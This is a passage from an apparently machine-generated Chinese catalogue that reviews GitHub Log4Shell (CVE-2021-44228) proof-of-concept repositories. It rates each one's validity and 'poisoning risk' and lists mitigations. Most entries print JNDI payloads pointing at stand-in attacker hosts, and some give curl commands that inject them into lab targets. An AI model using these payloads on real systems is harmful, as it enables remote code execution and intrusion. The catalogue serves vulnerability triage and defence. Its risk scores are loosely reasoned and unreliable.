CVE-2021-44228（Log4Shell）是Apache Log4j2中的一个严重漏洞，允许未经身份验证的远程代码执行。攻击者可以通过发送特制的日志请求，利用Log4j2的JNDI功能来执行任意代码。\n\n**漏洞利用方式：**\n\n1.  攻击者向使用存在漏洞的Log4j2组件的应用程序发送包含恶意JNDI查找字符串的请求。例如： `${jndi:ldap://attacker.com/evil}`\n2.  Log4j2在记录日志时，会解析该JNDI字符串，并尝试通过LDAP协议连接到攻击者控制的服务器（attacker.com）。\n3.  攻击者的LDAP服务器返回一个包含Java对象的引用。\n4.  Log4j2尝试加载并实例化该Java对象，从而导致攻击者控制的代码在服务器上执行。\n\n**有效性：** 根据漏洞库信息和搜索结果，该漏洞的POC代码是有效的。该漏洞已被广泛利用，并且互联网上存在大量的POC和利用工具。\n\n**投毒风险：**\n查看了提供的“漏洞利用代码”仓库的内容列表，主要包含以下信息:\n*   Advisory.md：提供漏洞相关的建议和缓解措施的链接。\n*   Exploitation.md：提供漏洞利用相关的链接，例如渗透测试指南和JNDI注入工具。\n*   Honeypots.md：提供蜜罐相关的链接。\n*   IOCs-Callback-Domains-IP-Addresses.md：提供IOC（Indicator of Compromise）和回调URL/IP地址的链接。\n*   Malware-Reports.md：提供恶意软件报告的链接。\n*   Mitigations-Fixes.md：提供缓解和修复措施的链接。\n*   Payloads-Obfuscation-WAF-Bypass.md：提供payload、混淆和WAF绕过相关的链接。\n\n总体而言，这个仓库主要是一个资源链接的集合，提供了关于CVE-2021-44228（Log4Shell）的各种信息，包括漏洞建议、利用方法、IOC、缓解措施和payload。\n\n其中`Exploitation.md`文件中链接的`JNDI-Injection-Exploit`、`JNDI-Exploit-Kit`和`marshalsec`等工具本身就是漏洞利用工具，如果用户下载并使用这些工具，可能会面临安全风险，例如被植入后门或恶意代码，或者被用于非法用途。但是这些工具本身是为了复现和验证漏洞使用的，并非作者投毒。\n仓库本身提供的信息比较杂乱，需要使用者具备一定的安全知识才能正确评估和使用。存在一定的误导性，有可能被不具备安全知识的人误用，或者被用于恶意目的，因此评估投毒风险为10%。

**项目地址:** [0xsyr0/Log4Shell](https://github.com/0xsyr0/Log4Shell)

**漏洞详情:** [CVE-2021-44228](https://nvd.nist.gov/vuln/detail/CVE-2021-44228)

---

## POC #3

**来源**: [CVE-2021-44228-Alan-coder-eng_log4j-cve-2021-44228-.md](../2021/CVE-2021-44228-Alan-coder-eng_log4j-cve-2021-44228-.md)

## CVE-2021-44228 - Apache Log4j2 JNDI 远程代码执行

**漏洞编号:** CVE-2021-44228

**漏洞类型:** 远程代码执行

**影响应用:** Apache Log4j2

**危害等级:** 高危，允许攻击者执行任意代码

**影响版本:** 2.0-beta9 至 2.15.0 (不包括安全版本 2.12.2, 2.12.3 和 2.3.1)

**利用条件:** 目标系统使用受影响版本的 log4j-core 并且启用了消息查找替换功能。攻击者需要能够控制日志消息或日志消息参数。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2021-44228 (Log4Shell) 是 Apache Log4j2 中的一个严重漏洞。攻击者可以通过在日志消息中插入恶意的 JNDI 查找字符串，利用 JNDI 功能从远程 LDAP 服务器加载和执行任意代码。 

**利用方式：**

1.  攻击者发送包含恶意 JNDI 查找字符串的请求，例如 `${jndi:ldap://attacker.com/evil}`，到目标应用程序。
2.  如果目标应用程序使用 Log4j2 记录该请求，Log4j2 将尝试解析该 JNDI 字符串。
3.  Log4j2 通过 JNDI 接口连接到攻击者控制的 LDAP 服务器 `attacker.com`。
4.  攻击者的 LDAP 服务器返回一个包含恶意 Java 类的响应。
5.  Log4j2 加载并执行该恶意 Java 类，导致远程代码执行。

**有效性：**

提供的 POC 代码（Vulhub 环境配置）有效，用于搭建一个可重现 Log4Shell 漏洞的环境。它通过 Docker-Compose 部署一个包含漏洞的 Apache Solr 实例，方便研究人员进行漏洞复现和分析。

**投毒风险：**

该仓库本身主要提供的是漏洞复现环境的配置，投毒风险较低。但是，使用任何第三方代码库或环境时，都需要谨慎评估潜在的风险。这里存在一定风险，因为攻击者可能篡改该仓库，在 LDAP 服务器返回的恶意 Java 类中植入恶意代码，使得利用漏洞时执行预期之外的操作。 因此评判投毒风险为10%，主要为潜在的供应链攻击风险。

**项目地址:** [Alan-coder-eng/log4j-cve-2021-44228-](https://github.com/Alan-coder-eng/log4j-cve-2021-44228-)

**漏洞详情:** [CVE-2021-44228](https://nvd.nist.gov/vuln/detail/CVE-2021-44228)

---

## POC #4

**来源**: [CVE-2021-44228-B1ack4sh_Blackash-CVE-2021-44228.md](../2021/CVE-2021-44228-B1ack4sh_Blackash-CVE-2021-44228.md)

## CVE-2021-44228 - Log4Shell

**漏洞编号:** CVE-2021-44228

**漏洞类型:** 远程代码执行 (RCE)

**影响应用:** Apache Log4j 2

**危害等级:** 极高危，可导致服务器完全控制

**影响版本:** 2.0-beta9 到 2.14.1

**利用条件:** 应用程序使用Log4j 2记录不受信任的输入，且未进行修复或缓解。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2021-44228，又名Log4Shell，是Apache Log4j 2中的一个远程代码执行漏洞。攻击者可以通过构造包含JNDI查找的恶意字符串，当Log4j 2记录该字符串时，会触发JNDI查找，从而从攻击者控制的LDAP服务器加载并执行恶意Java类。

**有效性：**
提供的POC代码有效。它展示了如何通过在HTTP请求头中注入`${jndi:ldap://evil.com/exploit}`这样的payload来触发漏洞。当应用程序记录User-Agent头时，Log4j 2会尝试解析该字符串，执行JNDI查找，并从evil.com加载恶意代码。

**投毒风险：**
分析提供的README.md文件，投毒风险较低，约为10%。主要风险在于以下几点：
* **依赖性风险：** 任何开源项目都存在依赖性风险。如果恶意作者控制了项目依赖的某个组件，则可能通过供应链攻击进行投毒。
* **人为因素：** 尽管README.md本身没有发现直接的恶意代码，但用户在使用过程中可能会受到误导，例如，将测试用的恶意LDAP服务器配置错误，导致意外的攻击或数据泄露。

**漏洞利用方式：**
1.  **攻击者构造恶意Payload：** 攻击者构造一个包含JNDI查找的payload，例如`${jndi:ldap://attacker.com/a}`。
2.  **注入Payload：** 攻击者将payload注入到应用程序可以记录的任何输入点，例如HTTP请求头（User-Agent、X-Forwarded-For等）、POST请求参数、WebSocket消息等。
3.  **触发日志记录：** 应用程序使用Log4j 2记录包含恶意payload的输入。
4.  **JNDI查找：** Log4j 2解析payload，执行JNDI查找，向attacker.com发起LDAP请求。
5.  **加载恶意代码：** 攻击者的LDAP服务器返回一个包含恶意Java类的响应。
6.  **远程代码执行：** Log4j 2加载并执行该Java类，导致远程代码执行。

**缓解措施：**
*   升级Log4j 2到最新版本 (>= 2.17.1)。
*   从JAR文件中删除`JndiLookup.class`。
*   设置系统属性`log4j2.formatMsgNoLookups=true`来禁用消息查找。
*   使用防火墙或出口ACL阻止出站LDAP/RMI流量。
*   在WAF/IDS规则中阻止`${jndi:` payload。

**项目地址:** [B1ack4sh/Blackash-CVE-2021-44228](https://github.com/B1ack4sh/Blackash-CVE-2021-44228)

**漏洞详情:** [CVE-2021-44228](https://nvd.nist.gov/vuln/detail/CVE-2021-44228)

---

## POC #5

**来源**: [CVE-2021-44228-Carlos-Mesquita_TPASLog4ShellPoC.md](../2021/CVE-2021-44228-Carlos-Mesquita_TPASLog4ShellPoC.md)

## CVE-2021-44228 - Apache Log4j2 Log4Shell RCE

**漏洞编号:** CVE-2021-44228

**漏洞类型:** 远程代码执行 (RCE)

**影响应用:** Apache Log4j2

**危害等级:** 高危，可能导致完全系统控制

**影响版本:** 2.0-beta9 到 2.15.0（不包括安全版本 2.12.2、2.12.3 和 2.3.1）

**利用条件:** 目标系统使用受影响版本的 Log4j2，且允许出站网络连接到攻击者的 LDAP/HTTP 服务器。

**POC 可用性:** 是

**投毒风险:** 1%

## 详情

CVE-2021-44228 (Log4Shell) 是一个存在于 Apache Log4j2 中的远程代码执行漏洞。攻击者可以通过构造特殊的日志消息，利用 JNDI 注入来执行任意代码。 

**有效性：**
根据提供的漏洞信息、搜索结果和漏洞利用代码，此漏洞的PoC代码有效。搜索结果表明该漏洞是真实存在的，并且有许多利用实例。

**投毒风险：**
分析提供的PoC代码，投毒风险很低。 
*   `LICENSE`: MIT许可，标准开源许可。 
*   `README.md`: 提供了PoC的详细信息，包括所需环境，操作步骤和WAF绕过方式等。 
*   `docker-compose.yaml`: 定义了frontend(React SPA)和backend(Spring Boot)两个服务, 其中backend使用了存在漏洞的Log4j2。 
*   `init.sh`: 这个脚本用于在攻击者机器上设置攻击环境。它编译JNDI利用所需的Java类，启动一个HTTP服务器来提供这些类，并启动一个LDAP服务器以响应JNDI查询。这个脚本是攻击的核心组成部分，但它本身的目的就是为了演示漏洞利用，不属于恶意投毒。它确实会下载编译好的文件到攻击者机器上，但这是漏洞利用的正常流程,本身不构成投毒。 但使用未经审核的脚本始终存在一定的风险，所以给了1%的风险.

**利用方式：**
1.  攻击者向目标系统发送包含恶意 JNDI 注入字符串的请求。该字符串形如`${jndi:ldap://attacker_host:ldap_port/Exploit}`。
2.  目标系统使用 Log4j2 记录该请求。由于存在漏洞，Log4j2 会解析 JNDI 字符串，并尝试通过 LDAP 协议连接到攻击者的服务器。
3.  攻击者的 LDAP 服务器返回一个指向 HTTP 服务器的响应，指示目标系统下载并执行一个 Java 类。
4.  目标系统下载并执行该 Java 类，从而实现远程代码执行。

**缓解措施：**
*   升级到 Log4j2 的安全版本 (>= 2.17.0)。
*   如果无法升级，可以设置 `log4j2.formatMsgNoLookups=true` 阻止 JNDI 查找。
*   使用 Web 应用防火墙 (WAF) 检测和阻止恶意的 JNDI 注入字符串。

**项目地址:** [Carlos-Mesquita/TPASLog4ShellPoC](https://github.com/Carlos-Mesquita/TPASLog4ShellPoC)

**漏洞详情:** [CVE-2021-44228](https://nvd.nist.gov/vuln/detail/CVE-2021-44228)

---

## POC #6

**来源**: [CVE-2021-44228-Fauzan-Aldi_Log4j-_Vulnerability.md](../2021/CVE-2021-44228-Fauzan-Aldi_Log4j-_Vulnerability.md)

## CVE-2021-44228 - Apache Log4j2 Log4Shell RCE

**漏洞编号:** CVE-2021-44228

**漏洞类型:** 远程代码执行 (RCE)

**影响应用:** Apache Log4j2

**危害等级:** 极高危，可导致完全服务器接管

**影响版本:** 2.0-beta9 到 2.15.0（不包括安全版本 2.12.2、2.12.3 和 2.3.1）

**利用条件:** 目标应用使用了受影响版本的Log4j2，并且允许通过用户可控的输入来记录日志。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2021-44228，也称为Log4Shell，是Apache Log4j2中的一个严重漏洞。攻击者可以通过向服务器发送特制的字符串，该字符串包含JNDI查找，从而利用此漏洞。当Log4j2尝试记录此字符串时，它会执行JNDI查找，导致服务器从攻击者控制的LDAP服务器下载并执行恶意代码。 

**漏洞利用方式：**

1.  攻击者向目标系统发送包含恶意JNDI查找的请求。例如： `${jndi:ldap://attacker.com/evil}` 
2.  如果目标系统使用受影响的Log4j2版本记录此请求，Log4j2将尝试执行JNDI查找。 
3.  Log4j2连接到攻击者控制的LDAP服务器(`attacker.com`)。 
4.  LDAP服务器返回一个包含恶意Java类的URL。 
5.  Log4j2从该URL下载并执行恶意Java类，导致远程代码执行。 

**POC有效性：**

从提供的`pom.xml`文件可以看出，POC代码使用了`log4j-core`和`log4j-api`的2.14.1版本，该版本受到CVE-2021-44228漏洞的影响。因此，如果部署包含此Log4j2版本的Web应用，则攻击者可以通过发送恶意payload触发漏洞。`forgotpass.java`文件展示了如何从request中获取参数，并将其拼接到输出中，这可能是触发漏洞的点，攻击者可以在username参数中插入恶意payload.

**投毒风险：**

分析提供的代码，`forgotpass.java`看似存在XSS漏洞，该文件只是简单地将用户输入（username）插入到HTML的JavaScript代码中，使其能弹出一个prompt窗口，之后跳转到主页。没有发现明显的用于进行恶意利用的代码，如反弹shell或进行其他类型的远程控制操作。 `log4j.java` 是一个Logger类，没有实际逻辑。 总体而言，仓库中存在隐藏的投毒代码的可能性较低，估计在10%左右。主要考虑到作者可能在LDAP服务器上部署恶意java文件，从而进行投毒。需要更深入的分析才能确定是否存在更隐蔽的投毒行为。

**项目地址:** [Fauzan-Aldi/Log4j-_Vulnerability](https://github.com/Fauzan-Aldi/Log4j-_Vulnerability)

**漏洞详情:** [CVE-2021-44228](https://nvd.nist.gov/vuln/detail/CVE-2021-44228)

---

## POC #7

**来源**: [CVE-2021-44228-KamalideenAK_Microsoft-Defender-for-Endpoint-Deployment-on-Windows-10-11-device.md](../2021/CVE-2021-44228-KamalideenAK_Microsoft-Defender-for-Endpoint-Deployment-on-Windows-10-11-device.md)

## CVE-2021-44228 Apache Log4j2 远程代码执行

**漏洞编号:** CVE-2021-44228

**漏洞类型:** 远程代码执行

**影响应用:** Apache Log4j2

**危害等级:** 高危，可能导致服务器完全控制

**影响版本:** 2.0-beta9 <= version <= 2.15.0 (excluding security releases 2.12.2, 2.12.3, and 2.3.1)

**利用条件:** 目标系统使用了受影响的Log4j2版本，并且允许攻击者控制Log4j2的日志消息或日志消息参数

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2021-44228，也被称为Log4Shell，是一个严重的远程代码执行漏洞，存在于Apache Log4j2 2.0-beta9到2.15.0版本中（不包括安全版本2.12.2、2.12.3和2.3.1）。

**有效性：**
漏洞库信息明确指出，在特定版本的Log4j2中，JNDI功能未对攻击者控制的LDAP和其他JNDI相关端点提供保护。如果攻击者可以控制日志消息或日志消息参数，并且启用了消息查找替换，则可以执行从LDAP服务器加载的任意代码。因此，可以判定漏洞利用代码有效。

**投毒风险：**
提供的漏洞利用代码只是一个GNU GPL v2许可协议的文本文件，不是漏洞利用的payload或者脚本，不包含任何可执行的代码，因此，不存在投毒代码。投毒风险为0%。

**利用方式：**
该漏洞的利用方式是，攻击者构造包含JNDI查找的恶意字符串，例如`${jndi:ldap://attacker.com/evil}`。当Log4j2记录此字符串时，它会尝试解析JNDI查找。这将导致Log4j2通过LDAP协议连接到攻击者控制的服务器`attacker.com`。攻击者可以在其LDAP服务器上托管一个恶意Java类，当Log4j2连接到LDAP服务器时，该类将被下载并执行，从而导致远程代码执行。需要注意的是，从Log4j 2.15.0开始，此行为已默认禁用，并在版本2.16.0中完全删除（以及2.12.2、2.12.3和2.3.1）。


**项目地址:** [KamalideenAK/Microsoft-Defender-for-Endpoint-Deployment-on-Windows-10-11-device](https://github.com/KamalideenAK/Microsoft-Defender-for-Endpoint-Deployment-on-Windows-10-11-device)

**漏洞详情:** [CVE-2021-44228](https://nvd.nist.gov/vuln/detail/CVE-2021-44228)

---

## POC #8

**来源**: [CVE-2021-44228-LucasPDiniz_CVE-2021-44228.md](../2021/CVE-2021-44228-LucasPDiniz_CVE-2021-44228.md)

## CVE-2021-44228-Apache Log4j2 JNDI 远程代码执行

**漏洞编号:** CVE-2021-44228

**漏洞类型:** 远程代码执行

**影响应用:** Apache Log4j2

**危害等级:** 高危，允许攻击者执行任意代码

**影响版本:** 2.0-beta9 到 2.15.0（不包括安全版本 2.12.2、2.12.3 和 2.3.1）

**利用条件:** 目标系统使用了受影响版本的Log4j2，且允许JNDI查找

**POC 可用性:** 是

**投毒风险:** 2%

## 详情

CVE-2021-44228 存在于 Apache Log4j2 中，利用了 JNDI 注入漏洞，攻击者通过控制日志消息或日志消息参数，可以执行从 LDAP 服务器加载的任意代码。利用方式如下：

1.  **构造恶意 JNDI 注入 Payload：** 攻击者构造包含 JNDI 查找的恶意字符串，例如 `${jndi:ldap://attacker.com/evil}`。
2.  **触发 Log4j2 记录 Payload：** 将恶意 Payload 注入到应用程序的日志消息中。这可以通过多种方式实现，例如通过 HTTP 请求头、POST 参数、用户输入等。
3.  **Log4j2 解析 Payload 并执行 JNDI 查找：** 当 Log4j2 记录包含恶意 Payload 的日志消息时，它会尝试解析 JNDI 查找。
4.  **连接到恶意 LDAP 服务器：**  Log4j2 会连接到攻击者控制的 LDAP 服务器（attacker.com）。
5.  **执行任意代码：** 恶意 LDAP 服务器会返回一个包含恶意 Java 类的响应，Log4j2 会加载并执行该类，从而导致远程代码执行。

**投毒风险分析：**

尽管该存储库提供了有价值的 PoC 和利用信息，但仍然存在作者投毒代码的微小风险。例如，LDAP 服务器响应中包含的恶意 Java 类可能包含后门，或在其他位置下载并执行恶意代码。为了将风险降至最低，应彻底审查提供的任何代码，并仅从受信任的来源下载所需的工具。

**项目地址:** [LucasPDiniz/CVE-2021-44228](https://github.com/LucasPDiniz/CVE-2021-44228)

**漏洞详情:** [CVE-2021-44228](https://nvd.nist.gov/vuln/detail/CVE-2021-44228)

---

## POC #9

**来源**: [CVE-2021-44228-Mintimate_log4j2-bugmaker.md](../2021/CVE-2021-44228-Mintimate_log4j2-bugmaker.md)

## CVE-2021-44228 Log4Shell 漏洞

**漏洞编号:** CVE-2021-44228

**漏洞类型:** 远程代码执行

**影响应用:** Apache Log4j2

**危害等级:** 高危，可能导致远程代码执行，系统完全控制

**影响版本:** 2.0-beta9 到 2.15.0 (不包括安全版本 2.12.2, 2.12.3, 和 2.3.1)

**利用条件:** 应用程序使用受影响的 Log4j2 版本，并且允许记录用户可控的输入。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2021-44228（Log4Shell）是 Apache Log4j2 中的一个远程代码执行漏洞。攻击者可以通过发送包含特定格式字符串（例如 `${jndi:ldap://attacker.com/a}`）的请求，如果该字符串被 Log4j2 记录，则 Log4j2 会尝试通过 JNDI（Java Naming and Directory Interface）去指定的LDAP服务器上查找并执行相应的代码。该演示项目使用了存在漏洞的 Log4j 2.14.1 版本，并提供了多种攻击方法，包括User-Agent头注入和查询参数注入。

**有效性：** 提供的POC代码有效，可以复现CVE-2021-44228漏洞。

**投毒风险：** 该项目主要用于演示漏洞，在`LICENSE`文件中明确声明“This project is intended for educational and security research purposes only. It contains intentionally vulnerable code (Log4j 2.14.1) to demonstrate the CVE-2021-44228 (Log4Shell) vulnerability. DO NOT use this code in production environments.”。因此，可以判断作者主观上没有投毒意图。但是仍然存在一定风险，因为用户在使用该项目时，可能会不小心将其部署到生产环境中，造成安全风险。因此投毒风险评估为10%。

**利用方式：**

1.  **漏洞触发：** 攻击者向目标应用程序发送包含恶意JNDI查找表达式的请求。例如，通过User-Agent头或者查询参数。
2.  **JNDI注入：** 当Log4j2记录包含该表达式的日志时，它会尝试解析该表达式。
3.  **远程代码执行：** Log4j2会通过JNDI向攻击者控制的LDAP服务器请求Java对象。攻击者的LDAP服务器返回一个包含恶意代码的Java对象。
4.  **代码执行：** Log4j2加载并执行该Java对象中的恶意代码，从而导致远程代码执行。

**项目地址:** [Mintimate/log4j2-bugmaker](https://github.com/Mintimate/log4j2-bugmaker)

**漏洞详情:** [CVE-2021-44228](https://nvd.nist.gov/vuln/detail/CVE-2021-44228)

---

## POC #10

**来源**: [CVE-2021-44228-OtisSymbos_CVE-2021-44228-Log4Shell-.md](../2021/CVE-2021-44228-OtisSymbos_CVE-2021-44228-Log4Shell-.md)

## CVE-2021-44228-Apache Log4j2-远程代码执行

**漏洞编号:** CVE-2021-44228

**漏洞类型:** 远程代码执行

**影响应用:** Apache Log4j2

**危害等级:** 高危，可能导致服务器完全控制

**影响版本:** 2.0-beta9 to 2.15.0 (excluding security releases 2.12.2, 2.12.3, and 2.3.1)

**利用条件:** 目标系统使用存在漏洞的Log4j2版本，且允许消息查找替换。

**POC 可用性:** 是

**投毒风险:** 95%

## 详情

CVE-2021-44228（Log4Shell）是Apache Log4j2中的一个严重漏洞，允许未经身份验证的远程代码执行。攻击者可以构造特殊的日志消息，其中包含JNDI查找，指向恶意LDAP或其他JNDI服务。当Log4j2处理这些日志消息时，它会尝试从攻击者控制的服务器下载并执行任意代码。 

提供的脚本 `log4j_remediation` 试图通过下载并替换Log4j2库文件来进行修复，但是从修复的角度来看,这个脚本存在严重的投毒风险，因为：

1. **URL 的变量名不规范**：`LOG4J_DOWNLOAD_URL` 变量中的 `2.x.y` 存在被攻击者修改的风险，攻击者可以劫持链接，使用恶意的Log4j2 jar 包，造成二次污染。
2. **覆盖现有的 Log4j JAR 文件**:  脚本直接复制下载的新 JAR 文件到应用程序目录，这可能会破坏应用程序的依赖关系，尤其是在不同版本的 Log4j 之间存在不兼容的情况下。
3. **未进行校验**:  脚本没有对下载的压缩包或 JAR 文件进行任何完整性校验（如哈希校验），无法确保下载的文件没有被篡改。
4. **依赖外部源**: 脚本依赖于外部 Apache 官方服务器下载 Log4j，如果该服务器被攻陷，则存在极高的投毒风险。
5. **版本不确定**: 脚本中的版本号 `2.x.y` 是一个占位符，这意味着脚本实际上没有指定要下载的具体 Log4j 版本，可能导致下载到不安全或不兼容的版本。


 **利用方式：** 

1.  攻击者找到任何会记录用户可控输入的Log4j2应用程序。
2.  攻击者在输入中插入恶意的JNDI查找字符串，例如 `${jndi:ldap://attacker.com/evil}`。
3.  当Log4j2记录包含此字符串的日志消息时，它会向`attacker.com`发起LDAP请求。
4.  `attacker.com`的LDAP服务器返回一个包含恶意Java类的响应。
5.  Log4j2加载并执行该恶意Java类，从而导致远程代码执行。

根据漏洞库信息，搜索引擎结果以及提供的漏洞利用代码进行综合分析， 漏洞利用的有效性高，投毒风险极高。

**项目地址:** [OtisSymbos/CVE-2021-44228-Log4Shell-](https://github.com/OtisSymbos/CVE-2021-44228-Log4Shell-)

**漏洞详情:** [CVE-2021-44228](https://nvd.nist.gov/vuln/detail/CVE-2021-44228)

---

## POC #11

**来源**: [CVE-2021-44228-PCMKUIT_CVE-2021-44228---Log4Shell-Analysis.md](../2021/CVE-2021-44228-PCMKUIT_CVE-2021-44228---Log4Shell-Analysis.md)

## CVE-2021-44228 - Log4Shell

**漏洞编号:** CVE-2021-44228

**漏洞类型:** 远程代码执行 (RCE)

**影响应用:** Apache Log4j2

**危害等级:** 高危，可能导致服务器完全控制

**影响版本:** 2.0-beta9 到 2.14.1

**利用条件:** 目标系统使用了受影响版本的 Log4j2，并且允许出站网络连接。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2021-44228 (Log4Shell) 是 Apache Log4j2 中的一个关键漏洞，它允许未经身份验证的远程代码执行。攻击者可以通过将恶意 JNDI 查找字符串注入到 Log4j2 记录的日志消息中来利用此漏洞。当 Log4j2 尝试解析并记录包含恶意 JNDI 查找的日志消息时，它会联系攻击者控制的 LDAP 或 RMI 服务器，并执行服务器返回的恶意代码。

**漏洞利用方式：**

1.  **攻击者构造恶意请求：** 攻击者将包含特定格式的恶意字符串（例如 `${jndi:ldap://attacker.com/evil}`）注入到应用程序可以记录的任何输入字段中，例如 HTTP 请求头、POST 数据、Web 表单等。
2.  **应用程序记录日志：** 如果应用程序使用受影响版本的 Log4j2 记录包含恶意字符串的输入，Log4j2 将尝试解析该字符串。
3.  **JNDI 查找触发：** Log4j2 发现 `${jndi:...}` 模式，触发 JNDI 查找。
4.  **连接恶意服务器：** Log4j2 使用指定的协议（例如 LDAP、RMI）连接到攻击者控制的服务器 (attacker.com)。
5.  **执行恶意代码：** 攻击者的服务器返回包含恶意 Java 对象的响应。Log4j2 反序列化该对象，导致在目标服务器上执行任意代码。

**有效性：**

提供的POC代码（技术分析文档）描述了该漏洞的原理，受影响版本以及利用过程，可以辅助构建PoC。漏洞利用的有效性取决于目标系统是否使用了受影响的Log4j2版本，并且是否允许出站网络连接到攻击者的JNDI服务器。由于 Log4Shell 在野外被广泛利用，因此认为提供的分析是基于真实可利用的漏洞的。

**投毒风险：**

提供的代码主要为技术分析文档，本身不包含可直接执行的恶意代码。但是，任何代码仓库都存在一定程度的投毒风险。在这种情况下，如果攻击者成功篡改了仓库中的分析文档，他们可能会插入误导性信息或隐藏的恶意链接，从而诱导用户下载或执行恶意软件。风险评估为10%，因仓库主要为分析文档，直接嵌入恶意代码可能性较低。

**项目地址:** [PCMKUIT/CVE-2021-44228---Log4Shell-Analysis](https://github.com/PCMKUIT/CVE-2021-44228---Log4Shell-Analysis)

**漏洞详情:** [CVE-2021-44228](https://nvd.nist.gov/vuln/detail/CVE-2021-44228)

---

## POC #12

**来源**: [CVE-2021-44228-SerpilRivas_log4shell-homework9.md](../2021/CVE-2021-44228-SerpilRivas_log4shell-homework9.md)

## CVE-2021-44228-Log4Shell

**漏洞编号:** CVE-2021-44228

**漏洞类型:** 远程代码执行 (RCE)

**影响应用:** Apache Log4j2

**危害等级:** 高危，允许未经身份验证的远程攻击者执行任意代码

**影响版本:** 2.0-beta9 到 2.15.0 (不包括安全版本 2.12.2、2.12.3 和 2.3.1)

**利用条件:** 目标应用程序使用受影响版本的 Log4j2，且允许记录用户可控的输入。

**POC 可用性:** 是

**投毒风险:** 5%

## 详情

CVE-2021-44228，也被称为 Log4Shell，是一个存在于 Apache Log4j2 中的严重漏洞。攻击者可以通过发送特制的字符串，其中包含 JNDI 查找，利用此漏洞执行任意代码。当 Log4j2 尝试记录这些字符串时，它会通过 JNDI 查找连接到攻击者控制的 LDAP 或其他 JNDI 服务，并执行恶意代码。

**漏洞利用方式：**

1.  攻击者发送包含`${jndi:<协议>://<攻击者服务器>/<资源>}`的恶意请求到目标系统。`${jndi}`是触发漏洞的关键部分，它指示 Log4j2 执行 JNDI 查找。
2.  目标系统使用 Log4j2 记录该请求。
3.  Log4j2 解析该字符串并尝试连接到攻击者指定的 JNDI 服务器（例如，LDAP）。
4.  JNDI 服务器返回恶意代码（例如，Java class 文件）。
5.  Log4j2 加载并执行该恶意代码，导致远程代码执行。

**POC有效性：**

根据漏洞库信息和搜索引擎结果，该漏洞非常有效，并被广泛利用。提供的 Dockerfile 和 `docker-compose.yml` 文件用于构建一个包含易受攻击的 Log4j2 版本的应用程序。`ldap_server.py` 模拟了一个恶意的 LDAP 服务器，用于提供攻击载荷。使用`curl http://localhost:8080?input=${jndi:ldap://localhost:8000/Exploit}`命令验证漏洞利用过程。

**投毒风险：**

分析提供的代码，投毒风险较低，约为 5%。主要依据如下：

*   `ldap_server.py` 仅用于模拟攻击，本身不包含任何恶意代码，只返回“Exploit payload simulated.”字符串。
*   Dockerfile 构建的镜像是使用受漏洞影响的Log4j2，目的是为了验证漏洞，不是为了投毒。
*   `pom.xml` 文件指定了 Log4j2 的版本为 2.17.1, 此版本已经修复了漏洞，但README.md文件中提到使用了存在漏洞的2.14.1版本，存在描述不一致，且依赖版本管理不严谨
*   虽然主体没有明显的投毒代码，但在真实环境中，攻击者可能会替换 `ldap_server.py` 中的 payload，或者修改 Dockerfile 构建恶意镜像。因此存在潜在的风险。
*   README.md文件描述了缓解措施，较为完备。

总体而言，提供的代码主要是用于漏洞演示和验证，而非恶意投毒。但开发者仍需保持警惕，在实际应用中注意代码审查和依赖管理。

**项目地址:** [SerpilRivas/log4shell-homework9](https://github.com/SerpilRivas/log4shell-homework9)

**漏洞详情:** [CVE-2021-44228](https://nvd.nist.gov/vuln/detail/CVE-2021-44228)

---

## POC #13

**来源**: [CVE-2021-44228-ShlomiRex_log4shell_lab.md](../2021/CVE-2021-44228-ShlomiRex_log4shell_lab.md)

## CVE-2021-44228 Log4Shell 远程代码执行

**漏洞编号:** CVE-2021-44228

**漏洞类型:** 远程代码执行

**影响应用:** Apache Log4j2

**危害等级:** 高危，可能导致服务器完全控制

**影响版本:** 2.0-beta9 <= version <= 2.15.0 (不包括安全版本 2.12.2, 2.12.3, 和 2.3.1)

**利用条件:** 目标系统使用受影响版本的Log4j2，且允许外部网络访问，日志记录功能开启并且记录用户可控的输入。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2021-44228（Log4Shell）是一个严重的安全漏洞，存在于Apache Log4j2 2.0-beta9到2.15.0版本中（不包括安全版本2.12.2、2.12.3和2.3.1）。

**漏洞利用方式：**

该漏洞源于Log4j2中的JNDI（Java Naming and Directory Interface）功能，该功能允许从LDAP和其他JNDI相关端点加载代码。当攻击者能够控制日志消息或日志消息参数时，他们可以利用此功能执行从LDAP服务器加载的任意代码。攻击者通过在Log4j2可以解析的日志消息中插入恶意JNDI查找字符串，例如`${jndi:ldap://attacker.com/evil}`，来触发该漏洞。当Log4j2尝试解析此字符串时，它会向`attacker.com`上的LDAP服务器发出请求，并执行从该服务器返回的Java代码。

提供的POC代码利用了这一点，使用`docker-compose`快速搭建了一个包含漏洞应用(`vul`)、LDAP服务器(`ldap_server`)和恶意代码服务器(`exploit_server`)的实验环境。利用步骤如下：

1.  使用`docker-compose up -d`启动实验环境。
2.  使用`curl`命令向漏洞应用发送包含恶意JNDI查找字符串的HTTP请求，例如：`curl -X GET http://localhost:8080/ -H "X-Api-Version: ${jndi:ldap://my_ldap_server:1389/a}"`。 其中`my_ldap_server`指向 docker-compose 启动的 ldap_server。
3.  LDAP服务器将请求重定向到恶意代码服务器，下载并执行恶意代码。
4.  验证漏洞是否成功利用，通常通过检查`vul`容器上的文件或观察其他系统行为。

**有效性：**

根据漏洞描述、搜索引擎结果和提供的POC代码，可以判断该POC代码是有效的。大量的安全报告和漏洞分析都确认了CVE-2021-44228的可利用性，并且该POC代码提供了一个易于部署的实验环境，用于验证该漏洞。

**投毒风险：**

评估该POC代码的投毒风险较低，大约10%。原因如下：

*   **明确的用途：** 该代码库旨在提供一个用于演示和测试Log4Shell漏洞的实验环境，其主要功能是复现漏洞，方便用户理解和学习。
*   **可见的组件：** 该代码库包含了`docker-compose.yml`文件以及构建LDAP服务器、恶意代码服务器的Dockerfile，这些文件是公开可见的，便于用户检查和审计。
*   **简单的逻辑：** 实验环境的搭建和漏洞利用流程相对简单，易于理解和验证。
*   **潜在的风险：** 尽管该代码库的主要目的是演示漏洞利用，但仍存在潜在的风险。例如，如果用户直接在生产环境中使用该代码库，可能会暴露其系统，受到攻击。此外，恶意攻击者可能会修改该代码库，添加恶意代码，然后传播给不知情的用户。但考虑到公开的性质和广泛的审查，直接包含恶意代码的可能性较低。

**风险缓减：**
